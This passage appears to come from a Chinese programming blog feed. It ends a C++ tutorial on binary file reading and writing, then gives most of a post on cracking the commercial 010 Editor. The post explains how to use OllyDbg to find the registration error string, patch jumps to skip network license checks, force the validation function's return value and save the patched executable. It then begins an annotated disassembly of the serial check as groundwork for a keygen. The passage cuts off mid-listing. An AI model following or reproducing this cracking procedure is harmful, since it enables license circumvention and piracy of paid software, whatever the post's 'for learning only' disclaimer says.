class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;fstream&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">char m_Name[64];</span><br><span class="line">int m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;二进制文件  写文件</span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;1、包含头文件</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;2、创建输出流对象</span><br><span class="line">ofstream ofs(&quot;person.txt&quot;, ios::out | ios::binary);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;3、打开文件</span><br><span class="line">&#x2F;&#x2F;ofs.open(&quot;person.txt&quot;, ios::out | ios::binary);</span><br><span class="line"></span><br><span class="line">Person p &#x3D; &#123;&quot;张三&quot;  , 18&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;4、写文件</span><br><span class="line">ofs.write((const char *)&amp;p, sizeof(p));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;5、关闭文件</span><br><span class="line">ofs.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><ul><li>文件输出流对象 可以通过write函数，以二进制方式写数据</li></ul><h4 id="5-2-2-读文件"><a href="#5-2-2-读文件" class="headerlink" title="5.2.2 读文件"></a>5.2.2 读文件</h4><p>二进制方式读文件主要利用流对象调用成员函数read</p><p>函数原型：<code>istream&amp; read(char *buffer,int len);</code></p><p>参数解释：字符指针buffer指向内存中一段存储空间。len是读写的字节数</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;fstream&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">char m_Name[64];</span><br><span class="line">int m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">ifstream ifs(&quot;person.txt&quot;, ios::in | ios::binary);</span><br><span class="line">if (!ifs.is_open())</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;文件打开失败&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person p;</span><br><span class="line">ifs.read((char *)&amp;p, sizeof(p));</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; &quot;姓名： &quot; &lt;&lt; p.m_Name &lt;&lt; &quot; 年龄： &quot; &lt;&lt; p.m_Age &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>文件输入流对象 可以通过read函数，以二进制方式读数据</li></ul><p>注明：本文转载自<a href="https://github.com/AnkerLeng/Cpp-0-1-Resource">https://github.com/AnkerLeng/Cpp-0-1-Resource</a></p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>010Editor的逆向----注册机的编写</title>
      <link href="2020/12/05/010Editor%E7%9A%84%E9%80%86%E5%90%91/"/>
      <url>2020/12/05/010Editor%E7%9A%84%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<p>注：此文章仅供学习使用，造成的一切后果与作者无关！！！</p><h1 id="样本概况"><a href="#样本概况" class="headerlink" title="样本概况"></a>样本概况</h1><img src="010Editor的逆向/010Editor_state.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><h2 id="程序信息"><a href="#程序信息" class="headerlink" title="程序信息"></a>程序信息</h2><p>它是需要注册的一个状态</p><p>一般这种情况都会有两种思路</p><p>​    1， 暴力破解（脚本小子）</p><p>​    2， 序列号解密（需要屏蔽网络验证）</p><h2 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h2><p>系统：Win 7 32为专业版</p><p>使用工具：IDA，OD，（PE/010Editor），VS2019</p><h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="提取关键字符串"><a href="#提取关键字符串" class="headerlink" title="提取关键字符串"></a>提取关键字符串</h3><p>一般在没有序列号的情况下随机输入是这样的</p><img src="010Editor的逆向/ErrorInfo.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>这个时候复制它的报错信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">---------------------------</span><br><span class="line">010 Editor</span><br><span class="line">---------------------------</span><br><span class="line">Invalid name or password. Please enter your name and password exactly as given when you purchased 010 Editor (make sure no quotes are included).</span><br><span class="line">---------------------------</span><br><span class="line">&amp;OK   </span><br><span class="line">---------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="使用OD打开010Editor"><a href="#使用OD打开010Editor" class="headerlink" title="使用OD打开010Editor"></a>使用OD打开010Editor</h3><img src="010Editor的逆向/InODOpen.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>让他运行起来（由于之前折腾过的原因我这里，点击运行后会直接弹出注册窗口，这个无所谓，只要你能找到这个窗口随机输入一个序列号，复制他的报错信息就可以了）</p><p>注：注册窗口在（Help–&gt;About…）</p><img src="010Editor的逆向/StartRun.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>右击反汇编界面–&gt;查找–&gt;所有参考文本字串</p><img src="010Editor的逆向/FindTextStr.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>在弹出的（文本字串参考位于）窗口右击–&gt;查找文本，，，输入之前提取的字符串（只需要关键字符串即可，如图）</p><img src="010Editor的逆向/RightStr.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>找到之后双击进入代码区域</p><img src="010Editor的逆向/InDubleCode.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>双击后会看到自己搜索的字符串</p><img src="010Editor的逆向/InFindStr.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><h3 id="找到关键函数"><a href="#找到关键函数" class="headerlink" title="找到关键函数"></a>找到关键函数</h3><p>要知道，搜索的字符串是是序列号错误的情况下输出的信息，所以需要找到什么地方判断序列号是错的从而跳转到该错误的信息处</p><p>当鼠标左键点击到push的字符串的那句代码上时下面的提示框显示了该语句来自于那个地址的跳转，这时可以右击该地址–&gt;单机（转到jnz来自）</p><img src="010Editor的逆向/jnz00DD5a79.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>跳转到的地方</p><img src="010Editor的逆向/JMP1.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>可以看到这一块都是比较后跳转，不用关系这些是往哪跳的，主要找到是哪跳过来的</p><p>接下来继续找到跳转到这里的的地方</p><img src="010Editor的逆向/JMP2.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>同样的方法继续，右击该地址–&gt;单机（转到jnz来自）</p><img src="010Editor的逆向/JMP3.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>这里有个关键信息 CMP edi，0xDB，要注意到跳转后的地方有赋值个EDI的指令</p><p>继续</p><img src="010Editor的逆向/JMP4.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>在这块地方可以得知EDI是call 00409C9B 这个函数的返回值，（说明这个函数是关键）</p><h3 id="更改指令"><a href="#更改指令" class="headerlink" title="更改指令"></a>更改指令</h3><p>先不用关注这个函数到底干了啥，现在掌握的基本只要确认DB的等于或者不等会得到什么样的结果（我这里已经试过了不等于DB代表的就是错误）</p><p>本来一开始是想改cmp esi,0xBD这条指令后面的跳转给Nop掉，但是前面有几个网络验证（俩三个call），所以我准备在函数返回值出来就写上跳转到cmp esi,0xBD这条指令的的跳转后面,地址是0x00DD592C（就是你要跳转的地方的最前面那串16进制）</p><img src="010Editor的逆向/JMPCMD.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>然后运行之后你会看到，“成功了”</p><img src="010Editor的逆向/vector.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>当然OD关了之后就会失效了，要把更改保存下来</p><h3 id="保存更改"><a href="#保存更改" class="headerlink" title="保存更改"></a>保存更改</h3><img src="010Editor的逆向/Save1.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><img src="010Editor的逆向/Save2.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><img src="010Editor的逆向/Save3.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>这样不能算完全破解，因为每次启动都会弹出注册框（虽然随便输入也能用，但是就是不爽）</p><p>所以继续分析</p><h3 id="完美破解"><a href="#完美破解" class="headerlink" title="完美破解"></a>完美破解</h3><p>回到刚刚地方分析那个关键函数</p><img src="010Editor的逆向/hanshu1.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>打上断点，运行之后步入看一下，主要关注的是DB是怎么返回的</p><p>一进来就看到的是网络验证，这层验证可以使用jmp直接跳过</p><img src="010Editor的逆向/network1.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>由于不知名的bug 导致我换了一个OD，分析是一样的</p><p>更改jmp</p><img src="010Editor的逆向/jmpchange1.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>继续往下分析</p><img src="010Editor的逆向/hanshu2.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>把每个比较的跳转都看一下跳到那</p><p>运气比较好，第一个比较0x2D就直接跳到了需要的返回值DB</p><img src="010Editor的逆向/h2retDB.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>进入关键函数，一般里面还有一层，直接回车即可（这个函数要记住，等下解密序列号的时候要详细分析这个函数）</p><img src="010Editor的逆向/hanshu3.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>接下只要把这个关键函数的返回值改成一直返回0x2D即可</p><p>进入函数之后更改如下</p><img src="010Editor的逆向/hanshu3change.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>更改完成后继续将程序运行起来，发现又走到一个网络验证</p><img src="010Editor的逆向/network2.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>这个网络验证的返回值为-1，直接把返回值强行修改为1，（尝试一下，看看结果如何）</p><p>同样进入这个函数，进入之后更改如下</p><img src="010Editor的逆向/network2change.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>再次将程序运行起来</p><p>这个时候发现成功了</p><img src="010Editor的逆向/vector2.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>再次保存，不过这次保存要整个保存，因为修改的地方太多（不然每修改一个地方就保存一次）</p><img src="010Editor的逆向/Saveone.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>一路确定之后，在下图窗口右击保存，（取一个名字，确定保存即可）</p><img src="010Editor的逆向/Savetwo.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>之后就能直接打开了</p><img src="010Editor的逆向/over.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>当然还有重要的一点，如果其中涉及重定位操作，最好把重定位标志去除</p><h2 id="解密序列号"><a href="#解密序列号" class="headerlink" title="解密序列号"></a>解密序列号</h2><p>解密序列号的话就不能像暴力破解哪有直接修改源代码，那是脚本小子干的事（当然网络验证还是得这么改）</p><p>接下来打卡原版的（未更改的010Editor），</p><h3 id="回到如下界面"><a href="#回到如下界面" class="headerlink" title="回到如下界面"></a>回到如下界面</h3><img src="010Editor的逆向/Inhanshu.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>进入之后长这样</p><img src="010Editor的逆向/InhanshuDemo.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>由于这个函数稍微有那麽一丢丢长，同时我也写上了注释，直接将他复制出来，以便查看</p><h3 id="函数的解析"><a href="#函数的解析" class="headerlink" title="函数的解析"></a>函数的解析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line">013BDBC0      55            PUSH EBP                                 ;  \</span><br><span class="line">013BDBC1      8BEC          MOV EBP,ESP</span><br><span class="line">013BDBC3      6A FF         PUSH -0x1</span><br><span class="line">013BDBC5      68 595E8801   PUSH 010Edito.01885E59                   ;  开辟栈帧</span><br><span class="line">013BDBCA   .  64:A1 0000000&gt;MOV EAX,DWORD PTR FS:[0]</span><br><span class="line">013BDBD0   .  50            PUSH EAX</span><br><span class="line">013BDBD1   .  83EC 18       SUB ESP,0x18                             ;  &#x2F;</span><br><span class="line">013BDBD4   .  53            PUSH EBX                                 ;  保存易失性寄存器</span><br><span class="line">013BDBD5   .  56            PUSH ESI</span><br><span class="line">013BDBD6   .  57            PUSH EDI</span><br><span class="line">013BDBD7   .  A1 F0CFE602   MOV EAX,DWORD PTR DS:[0x2E6CFF0]</span><br><span class="line">013BDBDC   .  33C5          XOR EAX,EBP                              ;  加密安全COOkie</span><br><span class="line">013BDBDE   .  50            PUSH EAX</span><br><span class="line">013BDBDF   .  8D45 F4       LEA EAX,DWORD PTR SS:[EBP-0xC]</span><br><span class="line">013BDBE2   .  64:A3 0000000&gt;MOV DWORD PTR FS:[0],EAX</span><br><span class="line">013BDBE8   .  8BF9          MOV EDI,ECX                              ;  把this给edi</span><br><span class="line">013BDBEA   .  8D5F 04       LEA EBX,DWORD PTR DS:[EDI+0x4]           ;  把user赋值个ebx</span><br><span class="line">013BDBED   .  C745 F0 00000&gt;MOV DWORD PTR SS:[EBP-0x10],0x0</span><br><span class="line">013BDBF4   .  8BCB          MOV ECX,EBX                              ;  把user赋值给ecx</span><br><span class="line">013BDBF6   .  C747 30 00000&gt;MOV DWORD PTR DS:[EDI+0x30],0x0</span><br><span class="line">013BDBFD   .  C747 18 00000&gt;MOV DWORD PTR DS:[EDI+0x18],0x0</span><br><span class="line">013BDC04   .  C747 34 00000&gt;MOV DWORD PTR DS:[EDI+0x34],0x0</span><br><span class="line">013BDC0B   .  FF15 B424E702 CALL DWORD PTR DS:[&lt;&amp;Qt5Core.?isEmpty@QS&gt;;  this指针的第一个四字节（2）与0比较，al&#x3D;&#x3D;0</span><br><span class="line">013BDC11   .  84C0          TEST AL,AL                               ;  0与上0 zf标志位赋值为1(表示相等)</span><br><span class="line">013BDC13   .  0F85 75020000 JNZ 010Edito.013BDE8E                    ;  不等则跳（跳到结束位置：等于报错）</span><br><span class="line">013BDC19   .  8D4F 08       LEA ECX,DWORD PTR DS:[EDI+0x8]           ;  把序列号给ecx</span><br><span class="line">013BDC1C   .  FF15 B424E702 CALL DWORD PTR DS:[&lt;&amp;Qt5Core.?isEmpty@QS&gt;;  this指针的第一个四字节（2）与0比较，al&#x3D;&#x3D;0</span><br><span class="line">013BDC22   .  84C0          TEST AL,AL                               ;  0与上0 zf标志位赋值为1(表示相等)</span><br><span class="line">013BDC24   .  0F85 64020000 JNZ 010Edito.013BDE8E                    ;  不等则跳（跳到结束位置：等于报错）</span><br><span class="line">013BDC2A   .  8D45 DC       LEA EAX,DWORD PTR SS:[EBP-0x24]          ;  把地址002ACC44给eax</span><br><span class="line">013BDC2D   .  8BCF          MOV ECX,EDI                              ;  把this指针给ecx</span><br><span class="line">013BDC2F   .  50            PUSH EAX                                 ;  把this指针push到栈中（作为参数传给下面的call）</span><br><span class="line">013BDC30   .  E8 3ABF04FF   CALL 010Edito.00409B6F                   ;  不知道干了什么（里面代码很乱先忽略）</span><br><span class="line">013BDC35   .  BE 1446E602   MOV ESI,010Edito.02E64614                ;  把字符串999给esi</span><br><span class="line">013BDC3A   .  8D9B 00000000 LEA EBX,DWORD PTR DS:[EBX]               ;  解一层引用，相当于把里面的地址（this指针）赋值给自己</span><br><span class="line">013BDC40   &gt;  FF36          PUSH DWORD PTR DS:[ESI]                  ;  把999放到栈中</span><br><span class="line">013BDC42   .  8BCB          MOV ECX,EBX                              ;  把this指针个ecx</span><br><span class="line">013BDC44   .  FF15 E82CE702 CALL DWORD PTR DS:[&lt;&amp;Qt5Core.??8QString@&gt;;  eax&#x3D;&#x3D;0（不知到怎么操作的）</span><br><span class="line">013BDC4A   .  84C0          TEST AL,AL                               ;  0与上0 zf&#x3D;&#x3D;1</span><br><span class="line">013BDC4C   .  0F85 23020000 JNZ 010Edito.013BDE75                    ;  zf为0时跳转</span><br><span class="line">013BDC52   .  83C6 04       ADD ESI,0x4                              ;  01234566789ABCDEF</span><br><span class="line">013BDC55   .  81FE 1846E602 CMP ESI,010Edito.02E64618                ;  01234566789ABCDEF 比 999</span><br><span class="line">013BDC5B   .^ 7C E3         JL SHORT 010Edito.013BDC40               ;  小于时短跳转（往回跳）</span><br><span class="line">013BDC5D   .  8A5D DF       MOV BL,BYTE PTR SS:[EBP-0x21]            ;  BL &#x3D; K[3]</span><br><span class="line">013BDC60   .  8A7D E1       MOV BH,BYTE PTR SS:[EBP-0x1F]            ;  BH &#x3D; K[5]</span><br><span class="line">013BDC63   .  80FB 9C       CMP BL,0x9C                              ;  比较K[3]，0x9C; Switch (cases 9C..FC)</span><br><span class="line">013BDC66   .  75 70         JNZ SHORT 010Edito.013BDCD8              ;  不等于就跳</span><br><span class="line">013BDC68   .  8A45 DC       MOV AL,BYTE PTR SS:[EBP-0x24]            ;  AL &#x3D; K[0]; Case 9C of switch 013BDC63</span><br><span class="line">013BDC6B   .  3245 E2       XOR AL,BYTE PTR SS:[EBP-0x1E]            ;  AL &#x3D; K[0]^K[6]</span><br><span class="line">013BDC6E   .  8845 E8       MOV BYTE PTR SS:[EBP-0x18],AL            ;  [EBP - 0x18] &#x3D; K[0]^K[6]</span><br><span class="line">013BDC71   .  8A45 DD       MOV AL,BYTE PTR SS:[EBP-0x23]            ;  AL &#x3D; K[1]</span><br><span class="line">013BDC74   .  3245 E3       XOR AL,BYTE PTR SS:[EBP-0x1D]            ;  AL &#x3D; K[1]^K[7]</span><br><span class="line">013BDC77   .  FF75 E8       PUSH DWORD PTR SS:[EBP-0x18]             ;  push K[0]^K[6]</span><br><span class="line">013BDC7A   .  0FB6C8        MOVZX ECX,AL                             ;  ECX &#x3D; (K[1]^K[6]) &amp; 0xFF</span><br><span class="line">013BDC7D   .  B8 00010000   MOV EAX,0x100                            ;  EAX &#x3D; 0x100</span><br><span class="line">013BDC82   .  66:0FAFC8     IMUL CX,AX                               ;  CX &#x3D; ((K[1]^K[6]) &amp; 0xFF) * 0x100</span><br><span class="line">013BDC86   .  8A45 DE       MOV AL,BYTE PTR SS:[EBP-0x22]            ;  AL &#x3D; K[2]</span><br><span class="line">013BDC89   .  32C7          XOR AL,BH                                ;  AL &#x3D; K[2]^k[5]</span><br><span class="line">013BDC8B   .  0FB6C0        MOVZX EAX,AL                             ;  EAX &#x3D; K[2]^K[5] &amp; 0xFF</span><br><span class="line">013BDC8E   .  66:03C8       ADD CX,AX                                ;  CX &#x3D; ((K[1]^K[6]) &amp; 0xFF) * 0x100) + (K[2]^K[5] &amp; 0xFF)</span><br><span class="line">013BDC91   .  0FB7F1        MOVZX ESI,CX                             ;  ESi &#x3D; (CX) &amp; 0xFFFF</span><br><span class="line">013BDC94   .  E8 AB9904FF   CALL 010Edito.00407644</span><br><span class="line">013BDC99   .  0FB6C0        MOVZX EAX,AL                             ;  AL &#x3D; (K[0]^K[6]^0x18+0x3D)^0xA7</span><br><span class="line">013BDC9C   .  56            PUSH ESI</span><br><span class="line">013BDC9D   .  8947 1C       MOV DWORD PTR DS:[EDI+0x1C],EAX</span><br><span class="line">013BDCA0   .  E8 23A704FF   CALL 010Edito.004083C8                   ;  判断余数，余数为0返回商否则返回0</span><br><span class="line">013BDCA5   .  8B4F 1C       MOV ECX,DWORD PTR DS:[EDI+0x1C]</span><br><span class="line">013BDCA8   .  83C4 08       ADD ESP,0x8</span><br><span class="line">013BDCAB   .  0FB7C0        MOVZX EAX,AX</span><br><span class="line">013BDCAE   .  8947 20       MOV DWORD PTR DS:[EDI+0x20],EAX</span><br><span class="line">013BDCB1   .  85C9          TEST ECX,ECX</span><br><span class="line">013BDCB3   .  0F84 BC010000 JE 010Edito.013BDE75                     ;  ECX !&#x3D; 0</span><br><span class="line">013BDCB9   .  85C0          TEST EAX,EAX</span><br><span class="line">013BDCBB   .  0F84 B4010000 JE 010Edito.013BDE75                     ;  EAX !&#x3D; 0</span><br><span class="line">013BDCC1   .  3D E8030000   CMP EAX,0x3E8</span><br><span class="line">013BDCC6   .  0F87 A9010000 JA 010Edito.013BDE75                     ;  EAX &lt;&#x3D; 0x3E8</span><br><span class="line">013BDCCC   .  83F9 02       CMP ECX,0x2                              ;  -----------------------------&lt;&lt;&lt;&lt;&lt;</span><br><span class="line">013BDCCF   .  1BF6          SBB ESI,ESI</span><br><span class="line">013BDCD1   .  23F1          AND ESI,ECX</span><br><span class="line">013BDCD3   .  E9 B3000000   JMP 010Edito.013BDD8B ; 这里直接往下跳到地址（013BDD8B）的位置</span><br><span class="line">013BDCD8   &gt;  80FB FC       CMP BL,0xFC</span><br><span class="line">013BDCDB   .  75 1F         JNZ SHORT 010Edito.013BDCFC</span><br><span class="line">013BDCDD   .  C747 1C FF000&gt;MOV DWORD PTR DS:[EDI+0x1C],0xFF         ;  Case FC of switch 013BDC63</span><br><span class="line">013BDCE4   .  BE FF000000   MOV ESI,0xFF</span><br><span class="line">013BDCE9   .  C747 20 01000&gt;MOV DWORD PTR DS:[EDI+0x20],0x1</span><br><span class="line">013BDCF0   .  C747 30 01000&gt;MOV DWORD PTR DS:[EDI+0x30],0x1</span><br><span class="line">013BDCF7   .  E9 8F000000   JMP 010Edito.013BDD8B</span><br><span class="line">013BDCFC   &gt;  80FB AC       CMP BL,0xAC</span><br><span class="line">013BDCFF   .  0F85 70010000 JNZ 010Edito.013BDE75</span><br><span class="line">013BDD05   .  8A45 DD       MOV AL,BYTE PTR SS:[EBP-0x23]            ;  Case AC of switch 013BDC63</span><br><span class="line">013BDD08   .  3245 E3       XOR AL,BYTE PTR SS:[EBP-0x1D]</span><br><span class="line">013BDD0B   .  0FB6C8        MOVZX ECX,AL</span><br><span class="line">013BDD0E   .  B8 00010000   MOV EAX,0x100</span><br><span class="line">013BDD13   .  66:0FAFC8     IMUL CX,AX</span><br><span class="line">013BDD17   .  8A45 DE       MOV AL,BYTE PTR SS:[EBP-0x22]</span><br><span class="line">013BDD1A   .  32C7          XOR AL,BH</span><br><span class="line">013BDD1C   .  C747 1C 02000&gt;MOV DWORD PTR DS:[EDI+0x1C],0x2</span><br><span class="line">013BDD23   .  0FB6C0        MOVZX EAX,AL</span><br><span class="line">013BDD26   .  66:03C8       ADD CX,AX</span><br><span class="line">013BDD29   .  0FB7C1        MOVZX EAX,CX</span><br><span class="line">013BDD2C   .  50            PUSH EAX</span><br><span class="line">013BDD2D   .  E8 96A604FF   CALL 010Edito.004083C8</span><br><span class="line">013BDD32   .  0FB7C0        MOVZX EAX,AX</span><br><span class="line">013BDD35   .  83C4 04       ADD 